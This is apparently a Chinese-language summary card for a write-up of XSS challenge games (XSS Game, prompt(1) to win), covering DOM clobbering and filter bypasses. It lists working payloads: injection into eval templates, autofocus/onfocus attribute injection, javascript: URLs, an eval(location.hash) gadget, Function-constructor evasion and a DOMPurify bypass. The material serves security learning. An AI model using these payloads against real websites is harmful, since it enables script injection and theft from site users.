---
title: 学习DOM破坏(DOM Clobbering)与XSS绕过技巧大全
contest: XSS Game系列 + prompt(1) to win + 看雪SDC 2025
year: 2025
difficulty: medium
vuln_type: xss
tags: [DOM_Clobbering, XSS, innerHTML, autofocus, onfocus, javascript伪协议, form_submit, DOMPurify, 8680439..toString(30), JSFuck, eval, location.hash, Function构造, XSS_Challenge]
attack_chain: spaghet(直接innerHTML无过滤) → maname(eval模板字符串) → wey(autofocus+onfocus) → ricardo(JavaScript伪协议+form.action submit) → will(innerHTML过滤反引号/括号/反斜杠) → balls(JSFuck URL编码) → mafia(eval(location.hash.slice(1))绕过50字符+过滤) → boomer(DOMPurify+tel:伪协议) → Object.getOwnPropertyNames(window).filter(Element$)找自定义toString
key_payload: ?jeff=";alert(1)// + ?wey="autofocus onfocus=alert(1337)" + ?ricardo=javascript:alert(1337) + ?balls=JSFuck + ?mafia=eval(location.hash.slice(1))#alert(1337) + ?boomer=<a id=ok href="tel:alert(1)">
one_liner: 看雪JGwebre总结XSS Game 9关DOM Clobbering与XSS绕过:innerHTML/eval/autofocus/javascript伪协议/JSFuck/Function/DOMPurify全覆盖。
lesson: innerHTML无过滤直接XSS;eval模板字符串可用";alert(1)// 注入;innerHTML+replace过滤可用autofocus+onfocus自动触发;form.action+submit可用javascript:伪协议;replace过滤alert可用Function(/ALERT(1337)/.source.toLowerCase())构造;slice(0,50)+replace过滤可用eval(location.hash.slice(1))跳转;DOMPurify+定时器+可点击元素可绕过。
quality: high
---
